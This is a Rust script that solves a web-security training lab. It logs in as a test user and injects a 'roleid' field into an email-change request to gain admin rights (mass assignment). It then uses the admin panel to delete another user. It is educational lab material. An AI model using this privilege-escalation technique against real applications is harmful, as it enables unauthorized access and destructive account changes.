/*****************************************************************
*
* Author: Ahmed Elqalawii
*
* Date: 5/9/2023
*
* Lab: User role can be modified in user profile
*
* Steps: 1. Login as wiener
*        2. Change the roleid of wiener
*        3. Fetch the admin panel
*        4. Delete carlos
*
******************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0ab900a30369a2de802f3f6b00e9009e.web-security-academy.net";
    // build the client used in all subsequent requests
    let client = build_client();

    // login as wiener
    print!("{} ", "1. Logging in as wiener..".white());
    io::stdout().flush();
    let login = client
        .post(format!("{url}/login"))
        .form(&HashMap::from([
            ("username", "wiener"),
            ("password", "peter"),
        ]))
        .send()
        .expect(&format!("{}", "[!] Failed to login".red()));
    let session = extract_session_cookie(login.headers())
        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
    println!("{}", "OK".green());

    // change the email and the roleid of wiener
    print!("{} ", "2. Changing roleid to 2..".white());
    io::stdout().flush();
    let change_email = client
        .post(format!("{url}/my-account/change-email"))
        .header("Cookie", format!("session={session}"))
        .header("Content-Type", "text/plain")
        .body(r#"{"email": "wiener@admin.net", "roleid": 2 }"#)
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to change the email and roleid".red()
        ));
    println!("{}", "OK".green());

    // fetch the admin panel
    // this step in not necessary in the script, you can do step 2 directly
    // it's only a must when solving the lab using the browser
    print!("{} ", "3. Fetching the admin panel..".white());
    io::stdout().flush();
    let admin_panel = client
        .get(format!("{url}/admin"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch the admin panel".red()));
    println!("{}", "OK".green());

    // delete carlos
    print!("{} ", "4. Deleting carlos..".white());
    io::stdout().flush();
    let delete_carlos = client
        .get(format!("{url}/admin/delete?username=carlos"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("{}", "[!] Failed to delete carlos".red()));
    println!("{}", "OK".green());

    println!(
        "{} {}",
        "[#] Check your browser, it should be marked now as"
            .white()
            .bold(),
        "solved".green().bold()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/********************************************
* Function to capture a pattern form a text
*********************************************/
fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.captures(text) {
        Some(text.get(1).unwrap().as_str().to_string())
    } else {
        None
    }
}

/**********************************************************
* Function to extract session field from the cookie header
***********************************************************/
fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
        Some(session.as_str().to_string())
    } else {
        None
    }
}
